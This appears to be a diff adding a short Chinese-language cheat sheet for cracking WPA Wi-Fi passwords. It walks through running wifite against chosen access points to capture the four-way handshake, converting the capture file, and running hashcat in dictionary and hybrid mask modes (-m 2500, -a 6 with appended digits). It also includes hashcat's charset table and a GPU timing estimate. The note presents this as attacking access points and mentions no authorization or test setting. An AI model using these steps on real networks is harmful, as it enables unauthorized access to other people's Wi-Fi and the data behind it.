@@ -1,0 +1,18 @@
+1. sudo wifite
+ctrl + c
+2. 输入你想要攻击的接入点NUM一栏所对应的数字（逗号隔开数字的形式选中多个接入点）
+3. Wifite成功截取四重握手包后，会尝试一些最基础的破解
+4. 在hs目录里可以找到一个.cap文件 使用  https://hashcat.net/cap2hccapx/  转换 为 .hccapx文件
+5. 命令让hashcat使用刚才下载的密码字典来破解 hashcat.exe -m 2500 [hccapx file] [dictionary file] --self-test-disable
+6. 密码可能是字典中的字符串加自定义字符串的形式，这个时候就要用到hashcat的混合模式
+hashcat.exe -a 6 -m 2500 [hccapx file] [dictionary file] ?d?d?d --self-test-disable
+其中-a 6表示混合模式，?d?d?d表示末尾添加3个任意数字。hashcat的字符集设定如下所示：
+?l = abcdefghijklmnopqrstuvwxyz
+?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
+?d = 0123456789
+?h = 0123456789abcdef
+?H = 0123456789ABCDEF
+?s = «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
+?a = ?l?u?d?s
+?b = 0x00 – 0xff
+# 值得注意的是，在混合模式下，自定义字符串的空间越大，破解时间也就会越长。（160M）示例中，以Radeon RX 5700 XT的算力需要运行10小时左右。
